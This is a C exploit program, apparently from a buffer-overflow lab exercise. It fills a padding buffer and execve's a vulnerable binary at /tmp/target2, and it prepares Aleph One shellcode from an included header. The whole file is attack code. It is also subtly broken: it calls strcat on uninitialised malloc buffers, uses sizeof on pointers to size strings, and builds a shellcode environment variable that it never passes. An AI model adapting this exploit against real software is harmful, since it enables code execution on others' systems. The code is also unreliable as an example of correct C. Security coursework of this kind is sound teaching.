#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

char *repeat(char *s, int x)
{
  //from https://stackoverflow.com/a/22599676/5552894
  char *result = malloc(sizeof(s) * x + 1);
  while (x > 0) {
      strcat(result, s);
      x --;
  }
  return result;
}

int main(void)
{
  char *args[4]; 
  char *env[1];

  char *noop = "A";
  int sled_length = 300;
  char *result = malloc(sizeof(noop)*sled_length + 2);
  char *result1 = repeat(noop, sled_length);
  strcat(result, result1);
  strcat(result, "\x00");

  char *preface = "shellcode=";
  char *envvar = malloc(sizeof(preface)+sizeof(shellcodeAlephOne)+1);
  strcat(envvar, preface);
  strcat(envvar, shellcodeAlephOne);
  
  args[0] = TARGET;
  args[1] = result;
  args[2] = "399";
  args[3] = NULL;
  
  env[0] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


